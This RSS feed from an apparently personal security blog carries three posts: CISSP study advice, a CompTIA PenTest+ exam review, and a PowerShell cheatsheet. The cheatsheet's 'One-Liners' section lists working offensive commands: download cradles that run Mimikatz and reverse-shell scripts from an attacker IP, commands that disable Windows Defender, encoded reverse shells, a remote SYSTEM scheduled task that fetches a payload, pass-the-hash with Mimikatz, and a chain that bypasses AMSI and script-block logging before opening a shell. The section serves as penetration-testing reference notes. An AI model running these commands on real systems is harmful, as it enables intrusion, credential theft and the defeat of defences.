<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Welcome to Tribal Knowledge</title>
        <link>https://tribalknowledgepage.github.io/posts/</link>
        <description>Recent content in Posts on Welcome to Tribal Knowledge</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Mon, 29 Nov 2021 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://tribalknowledgepage.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>How I passed CISSP 2021 CAT exam?</title>
            <link>https://tribalknowledgepage.github.io/posts/2021/11/how-i-passed-cissp-2021-cat-exam/</link>
            <pubDate>Mon, 29 Nov 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tribalknowledgepage.github.io/posts/2021/11/how-i-passed-cissp-2021-cat-exam/</guid>
            <description>Considered to be the gold standard of information security certifications, CISSP has definitely gone through multiple iterations since I first heard about it a decade ago. Having recently taken and passed the CISSP 2021 Computerized Adaptive Testing (CAT) exam, here is my take on it and some resources that may be helpful in your journey.
About the exam  The CISSP 2021 CAT exam tests a candidate on the following 8 domains:</description>
            <content type="html"><![CDATA[<p>Considered to be the gold standard of information security certifications, CISSP has definitely gone through multiple iterations since I first heard about it a decade ago. Having recently taken and passed the CISSP 2021 Computerized Adaptive Testing (CAT) exam, here is my take on it and some <a href="">resources</a> that may be helpful in your journey.</p>
<h2 id="about-the-exam">About the exam</h2>
<hr>
<p>The CISSP 2021 CAT exam tests a candidate on the following 8 domains:</p>
<ol>
<li>Security and Risk Management</li>
<li>Asset Security</li>
<li>Security Architecture and Engineering</li>
<li>Communication and Network Security</li>
<li>Identity and Access Management</li>
<li>Security Assessment and Testing</li>
<li>Security Operations</li>
<li>Software Development Security</li>
</ol>
<p>The official exam outline is available <a href="https://www.isc2.org/Certifications/CISSP/Certification-Exam-Outline">here</a>.</p>
<p>It has been some time now that the CISSP exam switched from the traditional 6 hours 250 questions format to the new 3 hours 100-150 questions CAT exam format.</p>
<p>The CAT exam format felt like a good break from the traditional multiple-choice exam. One of the highlights of this format is that you cannot &lsquo;Mark&rsquo; a question to review later or go back to a previously answered question, as the next question you see is based off of your response to the previous question (the &lsquo;Adaptive&rsquo; part of CAT). This can be a blessing for some folks and not so much for others. More on this format from the horse&rsquo;s mouth is available <a href="https://www.isc2.org/certifications/CISSP/CISSP-CAT">here</a>.</p>
<p>The best resource for further information is the <a href="https://www.isc2.org/Certifications/CISSP">official page</a> from (ISC)².</p>
<h2 id="exam-preparation">Exam preparation</h2>
<hr>
<p>I had studied on and off for CISSP over the last couple of years and recently decided to dedicate 2 months to seriously prepare for it. Here is rough breakout of that in four stages:</p>
<h3 id="stage-1-2-months-before-the-exam"><strong>Stage 1 (2 months before the exam)</strong></h3>
<p>Primary go-to resource for initial study was the <a href="https://www.wiley.com/en-us/(ISC)2+CISSP+Certified+Information+Systems+Security+Professional+Official+Study+Guide,+9th+Edition-p-9781119786238">Official Study Guide (OSG) - 9th Edition</a> and the <a href="https://www.linkedin.com/learning/paths/prepare-for-the-certified-information-systems-security-professional-cissp-exam">video course</a> on LinkedIn from Mike Chapple to complement the reading. Note that the videos are not a one-to-one mapping of the book but close enough.</p>
<p>Other video courses recommended in the community are Adam Gordon&rsquo;s <a href="https://www.itpro.tv/courses/isc2/accelerated-cissp-2021/">course</a> on ITProTV and Kelly Handerhan&rsquo;s <a href="https://www.cybrary.it/course/cissp/">course</a> on Cybrary, both updated for the 2021 version of the exam.</p>
<h3 id="stage-2-1-month-before-the-exam"><strong>Stage 2 (1 month before the exam)</strong></h3>
<p>Next logical step was to validate the knowledge retained by using the practice questions - one can never do enough of these. By the time I had to sit the exam, I think I had done over 4000 unique questions.</p>
<p>I used questions from OSG 9th Edition and the Official Practice Tests - 3rd Edition for the initial round and will recommend registering these books online on Wiley&rsquo;s website (steps to register are mentioned in the book) to get access to the questions online. This will give you the ability to flag incorrect questions and re-take questions without the hassle of erasing answers on your book and not to forget that you are expected to take the exam on a PC, so it&rsquo;ll be a good time to get accustomed to that.</p>
<h3 id="stage-3-3-weeks-before-the-exam"><strong>Stage 3 (3 weeks before the exam)</strong></h3>
<p>In order to retain the concepts, I went over the CISSP Mind Map videos from Rob Witcher at Destination Certification and the CISSP playlist by Pete Zerger at Inside Cloud and Security on YouTube. They are invaluable sources and give you good pointers to help retain the concepts with mnemonics and other tricks.</p>
<h3 id="stage-4-1-week-before-the-exam"><strong>Stage 4 (1 week before the exam)</strong></h3>
<p>Thor Pedersen&rsquo;s hard questions came highly recommended to inculcate the &ldquo;Manager mindset&rdquo; needed to succeed in the exam. 50-60% is considered a good score on these tests - you can always score more on these but understanding the rationale behind the correct and incorrect answers on these is the key to succes son the real exam.</p>
<p>On top of that, whenever you need a break from studying or a day before the exam, I would also recommend watching Larry Greenblatt&rsquo;s exam tips <a href="https://www.youtube.com/watch?v=HWg2geVJuvs">video</a> and Kelly Handerhan&rsquo;s <a href="https://www.youtube.com/watch?v=v2Y6Zog8h2A">video</a> on &lsquo;Why you will pass the CISSP&rsquo;.</p>
<p>And finally, a common theme for me during this preparation was being active on Certifcation Station&rsquo;s <a href="https://discord.com/invite/certstation">Discord channel</a>. They are a great bunch of talented folks who run free CISSP bootcamps every so often, taught by Adam Gordon and the discussions in the CISSP channel proved helpful in cementing the concepts.</p>
<h2 id="exam-experience">Exam experience</h2>
<hr>
<p>I went in to the testing center to take this exam which meant following the current COVID protocols - wearing a mask throughout the exam (brutal). Besides that it was the usual shenanigans you would expect - testing center validating your identity, etc.</p>
<p>Now to the questions on the exam. The first few questions were relatively easy and made me wonder if I was sitting the right exam. I believe that is part of the process to determine and adapt to the right level of difficulty, so take your time and make sure you answer these questions correctly - take at least 30 minutes to answer the first 20 odd questions.</p>
<p>After a few questions the test started throwing rather challenging (out-of-the-course) questions that stumbled me and ended up choosing the best response without wasting a lot of time. Quite honestly I hoped they were part of the experimental questions (ISC)² asks during the exam and do not count towards your final score. Following that, there was a mix of easy-medium-hard questions that followed until I reached question 100, at which point the exam ended for me.</p>

    <img src="https://media.giphy.com/media/13Cmju3maIjStW/giphy.gif"  alt="alt text"  class="center"   width="300"   height="250"  />


<p>Finally, when the results sheet was printed (and after the test center administrator took their sweet time to review it) it was shared with me.</p>
<p>It said &lsquo;Congratulations!&rsquo; - a moment to celebrate.</p>

    <img src="https://media.giphy.com/media/8Iv5lqKwKsZ2g/giphy.gif"  alt="alt text"  class="center"   width="400"   height="180"  />


<h2 id="summary-of-resources">Summary of resources</h2>
<hr>
<ol>
<li>Official Study Guide (OSG) - 9th Edition</li>
<li>Official Practice Tests - 3rd Edition</li>
<li>Mike Chapple&rsquo;s CISSP course on LinkedIn Learning</li>
<li>Adam Gordon&rsquo;s CISSP course on ITProTV</li>
<li>Kelly Handerhan&rsquo;s CISSP course on Cybrary</li>
<li>Rob Witcher&rsquo;s Mind Map videos - Destination Certification</li>
<li>Pete Zerger&rsquo;s CISSP playlist at Inside Cloud and Security</li>
<li>Larry Greenblatt&rsquo;s exam tips video and Kelly Handerhan&rsquo;s video on &lsquo;Why you will pass the CISSP&rsquo;</li>
<li>Certifcation Station&rsquo;s Discord channel, and</li>
<li>Prabh Nair&rsquo;s coffee shots.</li>
</ol>
<h2 id="final-thoughts">Final Thoughts</h2>
<hr>
<p>Here are some departing thoughts.</p>
<h3 id="visualize-your-pass"><strong>Visualize your pass</strong></h3>
<p>It is an underrated but powerful thing. I&rsquo;ve heard stories where folks have written their name followed by CISSP, [First name Last name - CISSP], on the notepad provided during the exam for this purpose. Others have updated their CV/resume before sitting the exam with the CISSP written on it. Use what works best for you.</p>
<h3 id="put-your-manager-hat-on"><strong>Put your &ldquo;manager&rdquo; hat on</strong></h3>
<p>You&rsquo;re likely to hear this more than you&rsquo;d want to during your CISSP preparation and there is a reason why - it might be THE single factor deciding your success on this exam. Kelly Handerhan and Larry Greenbalt explain this the best in their respective videos tagged earlier.</p>
<h3 id="make-your-own-study-notes"><strong>Make your own study notes</strong></h3>
<p>They don&rsquo;t need to be fancy/pretty but need to be yours. Personally, I used OneNote to paste all the important links and screenshots of all the questions I had challenge understanding.</p>
<p>It might feel overwhelming at first but if you break it down into smaller chunks, it is manageable.</p>
<h3 id="passing-the-exam-is-step-13"><strong>Passing the exam is step 1/3</strong></h3>
<p>Yes, when you pass the exam you have only &lsquo;provisionally&rsquo; passed the exam. Now, if you have the required experience to be called a CISSP, then step 2 is getting endorsed and step 3 is paying the Annual Maintenance Fee (AMF). If you are yet to acquire the minimum experience now, then you can apply to become an Associate of (ISC)². More details on this will be in the email from (ISC)² following your pass.</p>
<blockquote>
<p>Good luck on your CISSP journey. Cheers!!</p>
</blockquote>
]]></content>
        </item>
        
        <item>
            <title>CompTIA PenTest&#43; PTO-002 Beta exam experience and review</title>
            <link>https://tribalknowledgepage.github.io/posts/2021/10/comptia-pentest-pto-002-beta-exam-experience-and-review/</link>
            <pubDate>Fri, 29 Oct 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tribalknowledgepage.github.io/posts/2021/10/comptia-pentest-pto-002-beta-exam-experience-and-review/</guid>
            <description>Penetration testing is and has been a hot skill in the market for a while now. Many certification vendors such as Offensive Security, SANS and eLearnSecurity, to name a few, have been providing training and testing candidate&amp;rsquo;s skills by leveraging hands-on exams.
About the exam  CompTIA is a popular and respected brand in IT certification industry for many years now. Some of the popular certifications offered by CompTIA which you may have heard are A+, Network+ and Security+.</description>
            <content type="html"><![CDATA[<p>Penetration testing is and has been a hot skill in the market for a while now. Many certification vendors such as Offensive Security, SANS and eLearnSecurity, to name a few, have been providing training and testing candidate&rsquo;s skills by leveraging hands-on exams.</p>
<h2 id="about-the-exam">About the exam</h2>
<hr>
<p>CompTIA is a popular and respected brand in IT certification industry for many years now. Some of the popular certifications offered by CompTIA which you may have heard are A+, Network+ and Security+.</p>
<p>CompTIA launched their first penetration testing specific certification exam titled PenTest+ on July 31, 2018 (which is set to expire on April, 2022 per CompTIA&rsquo;s website) and more recently launched the updated version, <a href="https://www.comptia.org/certifications/pentest">PTO-002</a> on October 28, 2021.</p>
<p>Priced at $370 USD, the exam asks a maximum of 85 performance-based and multiple-choice questions. The allotted time to take the exam is 165 minutes and a candidate has to score a minimum of 750 (on a scale of 100-900) to pass. Taken from the official website, the exam tests the candidate on the following skills:</p>
<ul>
<li>Plan and scope a penetration testing engagement</li>
<li>Understand legal and compliance requirements</li>
<li>Perform vulnerability scanning and penetration testing using appropriate tools and
techniques, and then analyze the results</li>
<li>Produce a written report containing proposed remediation techniques, effectively
communicate results to the management team, and provide practical recommendations</li>
</ul>
<h2 id="my-impressions">My impressions</h2>
<hr>
<p>Earlier this year, I got the opportunity to take the Beta exam for PTO-002 and the results were recently declared, just before the official exam launch.</p>

    <img src="/img/pentestplus_cert.png"  alt="alt text"  class="center"   width="550"   height="400"  />


<p>A popular notion, when it comes to penetration testing, is legally launching attacks on organizations trying to break-in (depending on the goal) but there is more to a professional penetration test engagement. This course and exam certainly covers such aspects within the planning and scoping, legal and ethical requirements, reporting and communication sections which are all equally if not more important than vanilla attacking.</p>
<p>Firstly, what impressed me the most about this exam was the quality of questions. None of the questions asked on the exam gave away the answers based off of some keywords in the question, rather made sure that you understood the concept discussed in the question and are able to select an appropriate choice.</p>
<p>Secondly, some of the questions were around the logistics involved in a typical penetration test (covered in the &lsquo;Planning and Scoping&rsquo; section of their syllabus). The level of depth covered in this exam is not common to see in other parallel certifications.</p>
<h2 id="study-resources">Study resources</h2>
<hr>
<ol>
<li>
<p><a href="https://www.comptia.org/certifications/pentest#exampreparation">Here</a> is what CompTIA recommends for exam preparation.</p>
</li>
<li>
<p>Official study guide is available for pre-order on <a href="https://www.amazon.com/CompTIA-PenTest-Study-Guide-PT0-002/dp/1119823811">Amazon</a>.</p>
</li>
<li>
<p>To gain hands-on experience with attack tools and gain better understanding of the overall testing methodology, try TryHackMe&rsquo;s learning path for <a href="https://tryhackme.com/path/outline/pentestplus">CompTIA PenTest+</a>.</p>
</li>
</ol>
<h2 id="final-thoughts">Final thoughts</h2>
<hr>
<p>In the penetration testing domain of certifications, this is a relatively new entry-level certification with potential to grow and being recognized in the industry, compared to other established giants mentioned at the beginning of the post but being CompTIA, this certification is compliant with ISO 17024 standards and approved by the US DoD to meet directive 8140/8570.01-M requirements.</p>
<p>It is also relatively cheaper than other popular certifications like OSCP, GPEN and eCPPTv2.</p>
<p>I would recommend this to aspiring penetration testers, as studying for this exam will definitely give you a better understanding of the elements involved in &ldquo;professional&rdquo; penetration test offering from initiation to conclusion.</p>
]]></content>
        </item>
        
        <item>
            <title>PowerShell Cheatsheet</title>
            <link>https://tribalknowledgepage.github.io/posts/2021/10/powershell-cheatsheet/</link>
            <pubDate>Fri, 29 Oct 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tribalknowledgepage.github.io/posts/2021/10/powershell-cheatsheet/</guid>
            <description>This cheatsheet will continue to receive updates.
PowerShell (PS) 101 commands  Please note that all of the following commands are run from a PowerShell prompt.
Retrieve the PowerShell version
$PSVersionTable List help about a cmdlet in a readable format
Get-Help &amp;lt;cmdlet&amp;gt; | more List cmdlets which contain the keyword &amp;lsquo;service&amp;rsquo; in them
Get-Command -CommandType Cmdlet | ?{$_.Name -match &amp;#34;service&amp;#34;} List available commands in the current PS session and their respective details which contain the keyword &amp;lsquo;command&amp;rsquo; in them:</description>
            <content type="html"><![CDATA[<p>This cheatsheet will continue to receive updates.</p>
<h2 id="powershell-ps-101-commands">PowerShell (PS) 101 commands</h2>
<hr>
<p>Please note that all of the following commands are run from a PowerShell prompt.</p>
<p>Retrieve the PowerShell version</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"> $PSVersionTable 
</code></pre></div><p>List help about a cmdlet in a readable format</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Help &lt;cmdlet&gt; | more
</code></pre></div><p>List cmdlets which contain the keyword &lsquo;service&rsquo; in them</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType Cmdlet | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;service&#34;</span>}
</code></pre></div><p>List available commands in the current PS session and their respective details which contain the keyword &lsquo;command&rsquo; in them:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType All -ShowCommandInfo | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;command&#34;</span>}
</code></pre></div><p>Wildcards can be used to match as well.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType All | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;serv*&#34;</span>}
</code></pre></div><p>Count the number of commands in the output</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(Get-Command -CommandType All | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;command&#34;</span>}).count
</code></pre></div><p>List all cmdlets with PKI as source</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType Cmdlet | ?{$_.Source <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;PKI&#34;</span>}
</code></pre></div><p>List available commands in a module by running</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -Module &lt;module name&gt;
</code></pre></div><h2 id="handy-tweaks">Handy Tweaks</h2>
<hr>
<p>When you launch PowerShell session, it opens in the user&rsquo;s home directory by default. This behavior can be modified so that new PS sessions open in a custom directory. Here is how:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Check the value of $PROFILE variable.</span>

PS C:\Windows\system32&gt; $PROFILE
C:\Users\XXXXXXXXX\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1

<span style="color:#75715e"># Create the .ps1 file returned from the $PROFILE variable</span>

PS C:\Windows\system32&gt; New-Item -Path $PROFILE -Type File -Force

<span style="color:#75715e"># To set and change the default working directory, open the above &#39;Microsoft.PowerShell_profile.ps1&#39; in ISE and add the following line with your desired path.</span>

Set-location &lt;Custom directory path&gt;
</code></pre></div><h2 id="one-liners">One-Liners</h2>
<hr>
<h3 id="creating-a-firewall-rule-exception-in-windows">Creating a firewall rule exception in Windows</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">New-NetFirewallRule -DisplayName <span style="color:#e6db74">&#39;HTTP-Inbound&#39;</span> -Profile @(<span style="color:#e6db74">&#39;Domain&#39;</span>, <span style="color:#e6db74">&#39;Private&#39;</span>) -Direction Inbound -Action Allow -Protocol TCP -LocalPort @(<span style="color:#e6db74">&#39;80&#39;</span>, <span style="color:#e6db74">&#39;443&#39;</span>)

New-NetFirewallRule -DisplayName <span style="color:#e6db74">&#39;447-Inbound&#39;</span> -Profile @(<span style="color:#e6db74">&#39;Domain&#39;</span>, <span style="color:#e6db74">&#39;Private&#39;</span>) -Direction Inbound -Action Allow -Protocol TCP -LocalPort @(<span style="color:#e6db74">&#39;447&#39;</span>)
</code></pre></div><h3 id="download-cradles">Download cradles</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Option 1 - Using IEX (compatible with older versions of PS)</span>

powershell iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#34;http://192.168.X.X/Invoke-MimikatzEX.ps1&#34;</span>)

<span style="color:#75715e"># Option 2 - Using IWR (works on current version of PS)</span>

iwr -UseBasicparsing http<span style="color:#960050;background-color:#1e0010">:</span>//192.168.X.X/Invoke-PowerShellRev.ps1 | iex
</code></pre></div><h3 id="creating-a-credential-object">Creating a Credential object</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;XXXXXXXXXXXX&#39;</span> -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;domain\user&#39;</span>, $SecPassword)

</code></pre></div><h3 id="decode-base64">Decode Base64</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$EncodedText = <span style="color:#960050;background-color:#1e0010">“</span>VABoA....<span style="color:#960050;background-color:#1e0010">”</span>

$DecodedText = <span style="color:#66d9ef">[System.Text.Encoding]</span>::Unicode.GetString(<span style="color:#66d9ef">[System.Convert]</span>::FromBase64String($EncodedText))

$DecodedText
</code></pre></div><h3 id="disable-av">Disable AV</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-MpPreference -DisableRealtimeMonitoring $true

Set-MpPreference -DisableIOAVProtection $true
</code></pre></div><h3 id="encode-reverse-shell">Encode reverse shell</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">. .\Invoke-Encode.ps1

Invoke-Encode -DataToEncode .\Invoke-PowerShellTcpOneLine.ps1 -OutCommand

<span style="color:#75715e"># Open a listener (nc) on one end and on another shell use: </span>

powershell -e &lt;content of encodedcommand.txt&gt;
</code></pre></div><h3 id="reverse-shell-using-a-batch-file">Reverse shell using a Batch file</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Create reverse.bat file</span>

$Contents = <span style="color:#e6db74">&#39;powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(&#39;&#39;http://192.168.X.X/Invoke-PowerShellRev8080.ps1&#39;&#39;))&#39;</span>
Out-File -Encoding Ascii -InputObject $Contents -FilePath C:\...\Tools\reverse8080.bat

<span style="color:#75715e"># Call reverse.bat file</span>

<span style="color:#75715e">## Option 1</span>
.rotten.exe * reverse.bat

<span style="color:#75715e">## Option 2</span>
Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:&lt;NTLMHASH&gt; /run:C:\users\.....\desktop\reverse.bat&#34;&#39;</span>
</code></pre></div><h3 id="scheduled-tasks">Scheduled tasks</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">schtasks /create /S dc.contoso.local /SC Weekly /RU <span style="color:#e6db74">&#34;NT Authority\SYSTEM&#34;</span> /TN <span style="color:#e6db74">&#34;UserX&#34;</span> /TR <span style="color:#e6db74">&#34;powershell.exe -c &#39;iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://172.16.X.X/Invoke-PowerShellRev8080.ps1&#39;&#39;&#39;)&#39;&#34;</span>

schtasks /Run /S dc.contoso.local /TN <span style="color:#e6db74">&#34;UserX&#34;</span>
</code></pre></div><h3 id="invoke-wmimethod---command-execution-reverse-shell-etc">Invoke-WMIMethod - Command Execution (Reverse shell, etc.)</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-WmiMethod win32_process -ComputerName dc.contoso.local -name create -argumentlist <span style="color:#e6db74">&#34;powershell.exe -e $encodedCommand&#34;</span>
</code></pre></div><h3 id="chain-powershell-commands-to-bypass-sblogging-then-amsibypass-and-then-get-reverse-shell">Chain powershell commands to Bypass SBLogging, then AMSIBypass and then get reverse shell</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -c <span style="color:#e6db74">&#34;iex (iwr -UseBasicParsing http://192.168.X.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.X.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.X.X/Invoke-PowerShellTcpEx.ps1)
</span></code></pre></div><h3 id="check-local-admin-access-via-invoke-command">Check local admin access via Invoke-Command</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName (Get-Content ..\Output\computers.txt) 2&gt;$null
</code></pre></div><h3 id="over-pass-the-hash">Over pass-the-hash</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:&lt;NTLMHASH&gt; /run:powershell.exe&#34;&#39;</span>
</code></pre></div><h2 id="playing-with-command-output">Playing with command output</h2>
<hr>
<h3 id="1-expand-redacted-output">1. Expand redacted output</h3>
<p>You might notice that sometimes the output returned by PS commands is redacted with &ldquo;&hellip;&rdquo;. This can be corrected by modifying the value of the PS variable - <code>$FormatEnumerationLimit</code> as follows.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$FormatEnumerationLimit = -1
</code></pre></div><h3 id="2-using-more-command">2. Using &lsquo;more&rsquo; command</h3>
<p>Piping output of a command to <code>more</code> command makes it readable from the first line. This is equivalent to <code> less</code> command in Linux/Unix.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Process | more
</code></pre></div><h3 id="3-using--expandproperty">3. Using -ExpandProperty</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-CimClass -Namespace root/SecurityCenter2 -MethodName * | select -ExpandProperty CimClassMethods
</code></pre></div><h3 id="4-exporting-output-in-a-csv-format">4. Exporting output in a CSV format</h3>
<p>Sometimes (more than we&rsquo;d think) having the output in a CSV file is a blessing. Here is how it can be done using <code>Export-CSV</code> cmdlet.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Date | Select-Object -Property DateTime, Day, DayOfWeek, DayOfYear | Export-Csv -Path .\DateTime.csv -NoTypeInformation
</code></pre></div>]]></content>
        </item>
        
    </channel>
</rss>
